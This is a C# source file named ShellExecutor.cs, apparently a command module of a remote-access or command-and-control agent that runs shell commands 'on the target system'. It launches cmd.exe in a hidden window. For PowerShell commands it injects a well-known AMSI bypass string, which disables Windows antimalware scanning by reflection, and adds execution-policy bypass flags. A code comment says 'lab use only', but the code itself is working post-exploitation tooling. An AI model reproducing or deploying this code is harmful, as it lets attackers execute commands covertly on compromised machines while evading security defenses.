// ShellExecutor.cs
// Executes cmd/PowerShell commands on the target system

using System;
using System.Diagnostics;
using Agent.Utils;

namespace Agent.CommandModules
{
    public static class ShellExecutor
    {
        public static string Run(string cmd)
        {
            try
            {
                if (cmd.StartsWith("powershell ", StringComparison.OrdinalIgnoreCase))
                {
                    // AMSI bypass (lab use only)
                    string amsiBypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
                    cmd = $"powershell -exec bypass -nop -c \"{amsiBypass}; {cmd.Substring(11)}\"";
                }
                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                var proc = Process.Start(psi);
                string output = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit();
                Logger.Log($"Executed command: {cmd}");
                return output;
            }
            catch (Exception ex)
            {
                Logger.Log($"ShellExecutor error: {ex.Message}");
                return $"Error: {ex.Message}";
            }
        }
    }
}
